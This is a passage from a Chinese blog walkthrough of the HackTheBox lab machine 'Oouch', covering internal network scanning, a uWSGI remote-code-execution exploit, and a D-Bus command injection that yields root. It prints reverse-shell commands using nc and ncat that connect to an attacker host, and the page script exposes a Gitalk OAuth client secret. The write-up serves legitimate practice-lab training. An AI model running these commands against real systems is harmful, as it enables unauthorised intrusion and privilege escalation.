6a:b9:9a:01:dd:04 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">    inet6 fe80::68b9:9aff:fe01:dd04/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>直接探测22端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for IP in &#123;1..255&#125;; do</span><br><span class="line">  timeout 1 bash -c "&lt;/dev/tcp/172.17.0.$IP/22 &amp;&gt;/dev/null" &amp;&amp;  echo "IP $IP is open"</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071702.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>探测发现172.18.0.3开放(可能不同，比如参考资料是172.18.0.2，我打的时候是172.18.0.3)，直接用当前qtc用户私钥即可登录：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071701.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><p> 有个code目录，应该是前面5000和8000端口的web代码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071703.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="dbus"><a href="#dbus" class="headerlink" title="dbus"></a>dbus</h2><p>外面有一个note ,里面有提示信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat .note.txt</span><br><span class="line">Implementing an IPS using DBus and iptables == Genius?</span><br></pre></td></tr></table></figure>

<p>docker里flask有相关代码实现：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat oouch/routes.py | grep dbus</span><br><span class="line">import dbus</span><br><span class="line">            bus = dbus.SystemBus()</span><br><span class="line">            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')</span><br></pre></td></tr></table></figure>

<p> 根据代码中dbus接口信息，尝试使用dbus-send,没有权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block &#x2F;htb&#x2F;oouch&#x2F;Block  htb.oouch.Block.Block &quot;string:;rm &#x2F;tmp&#x2F;.0; mkfifo &#x2F;tmp&#x2F;.0; cat &#x2F;tmp&#x2F;.0 | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.1 7777 &gt;&#x2F;tmp&#x2F;.0;&quot;</span><br><span class="line"></span><br><span class="line">Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type&#x3D;&quot;method_call&quot;, sender&#x3D;&quot;:1.297&quot; (uid&#x3D;1000 pid&#x3D;6674 comm&#x3D;&quot;dbus-send --system --print-reply --dest&#x3D;htb.oouch.&quot;) interface&#x3D;&quot;htb.oouch.Block&quot; member&#x3D;&quot;Block&quot; error name&#x3D;&quot;(unset)&quot; requested_reply&#x3D;&quot;0&quot; destination&#x3D;&quot;htb.oouch.Block&quot; (uid&#x3D;0 pid&#x3D;2600 comm&#x3D;&quot;&#x2F;root&#x2F;dbus-server &quot;)</span><br></pre></td></tr></table></figure>

<p>查看外面配置,确认是需要www-root用户：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!-- -*- XML -*- --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC</span><br><span class="line"> "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"</span><br><span class="line"> "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;</span><br><span class="line"></span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line"></span><br><span class="line">    &lt;policy user="root"&gt;</span><br><span class="line">        &lt;allow own="htb.oouch.Block"/&gt;</span><br><span class="line">    &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">	&lt;policy user="www-data"&gt;</span><br><span class="line">		&lt;allow send_destination="htb.oouch.Block"/&gt;</span><br><span class="line">		&lt;allow receive_sender="htb.oouch.Block"/&gt;</span><br><span class="line">	&lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure>

<h1 id="uswgi"><a href="#uswgi" class="headerlink" title="uswgi"></a>uswgi</h1><p>进程可以看到uwsgi,版本是2.0.17.1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ uwsgi --version</span><br><span class="line">2.0.17.1</span><br></pre></td></tr></table></figure>

<p> 搜索发现相关漏洞及exp：</p>
<ul>
<li>webcgi-exploits/uwsgi-rce-zh.md at master · wofeiwo/webcgi-exploits<br><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md</a></li>
<li><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a></li>
</ul>
<h2 id="uwsgi-exp"><a href="#uwsgi-exp" class="headerlink" title="uwsgi exp"></a>uwsgi exp</h2><p>把需要的东西都传到docker里，外面监听端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ ls -al</span><br><span class="line">total 2864</span><br><span class="line">drwxrwxrwt 1 root     root        4096 Jul 17 05:54 .</span><br><span class="line">drwxr-xr-x 1 root     root        4096 Feb 25 12:33 ..</span><br><span class="line">-rwxr-xr-x 1 qtc      qtc      2914424 Jul 17 05:52 ncat</span><br><span class="line">-rwxr-xr-x 1 qtc      qtc         4334 Jul 17 05:54 uswgi.py</span><br><span class="line">srw-rw-rw- 1 www-data www-data       0 Jul 17 04:35 uwsgi.socket</span><br><span class="line">qtc@aeb4525789d8:/tmp$ python uswgi.py -m unix -u /tmp/uwsgi.socket -c "/tmp/ncat -e /bin/bash 172.18.0.1 7777"</span><br></pre></td></tr></table></figure>

<p>外面得到docker的www-root用户shell：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071704.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="dbus-exploit-get-root-flag"><a href="#dbus-exploit-get-root-flag" class="headerlink" title="dbus exploit get root flag"></a>dbus exploit get root flag</h1><p>然后再开一个监听，用www-root的shell执行dbus-send,得到root权限shell,读取root.txt：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block &#x2F;htb&#x2F;oouch&#x2F;Block  htb.oouch.Block.Block &quot;string:;rm &#x2F;tmp&#x2F;.0; mkfifo &#x2F;tmp&#x2F;.0; cat &#x2F;tmp&#x2F;.0 | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.1 7778 &gt;&#x2F;tmp&#x2F;.0;&quot;</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071705.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Attacking the OAuth Protocol - Dhaval Kapil<br><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a></li>
<li>webcgi-exploits/uwsgi-rce-zh.md at master · wofeiwo/webcgi-exploits<br><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md</a></li>
<li><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a></li>
<li>[HTB] Ooch writeup – Phantom InfoSec<br><a href="https://phantominfosec.wordpress.com/2020/04/02/htb-ooch-writeup/" target="_blank" rel="noopener">https://phantominfosec.wordpress.com/2020/04/02/htb-ooch-writeup/</a></li>
<li>Hackthebox oouch machine walkthrough | htb oouch machine writeup - YouTube<br><a href="https://www.youtube.com/watch?v=oriAA1ccPpc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=oriAA1ccPpc</a></li>
<li>HTB | OOUCH | Walkthrough | na5c4r - YouTube<br><a href="https://www.youtube.com/watch?v=cn57ZvaXWPg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=cn57ZvaXWPg</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2020-08-03T00:28:30.943Z" itemprop="dateUpdated">2020-08-03 08:28:30</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&title=《Oouch - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&title=《Oouch - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Oouch - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/07/22/SneakyMailer-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">SneakyMailer - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/07/14/Tabby-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Tabby - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>本部落格係採用<a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh_TW" target="_blank">創用 CC 姓名標示 4.0 國際 授權條款授權</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&title=《Oouch - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&title=《Oouch - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Oouch - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/07/17/Oouch-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACNElEQVR42u3aQXKDMAwF0Nz/0nSmq8wkwJcMbWI/rxjqkjwWimTp8YjX9ruer5/vHO953X98/frkyxYGBsbXMrbD9fphyZ29v+49v/o63vwvBgbGAozq45IQmYTa6uvYvY+BgYFxGECrwTH/6hgYGBhXBdzjPTkeAwMD45iRFLFVWF7E5vcvqMUxMDC+kNFrDPzN9e39DQwMjI9nbMVVTRx7TdDyt8LAwJiakbcnk1CYl695czRPPTEwMGZl5GVq3pisHqJVm5pv7mBgYCzAyIcneiMU1QCap5gYGBjrMKrpYHJwn49r9A71Tn43MDAwJmJU691yKGw1O5ttAwwMjKkZI2ni+NOqgx23ZLsYGBgfzLg4OQuakSM7d/EYGBhTM0YC3x3BtNpMxcDAWIHROxrrHf3nYTr/AcDAwFiHkR/u5+VrtcM49DQMDIypGcdl5Pho6b8Nh2FgYEzEaPYQgpo4P2LLP333pWBgYEzNyANltXytjo7l+096sBgYGMswqsMWeYJYHR2LclsMDIypGXeng9URiuYoBgYGxgKMaopWDYvVpLCaaGJgYMzNqDYGrkooe4H45BtiYGBMytiKa6R8HcnlTl4BBgbG1IzeeFaezI2E7N54BwYGxqyMJMiOXFc7Fc2QioGBsQAjCXz5YVwvlA/txMDAwCiOU/Qy095gGQYGBkY17UsO13qvKWphYmBgTM3Ig2Ze6FYHKXrhGAMDYwVGr4CsJn9X4fORDgwMjCkYPxanGQauEGmvAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
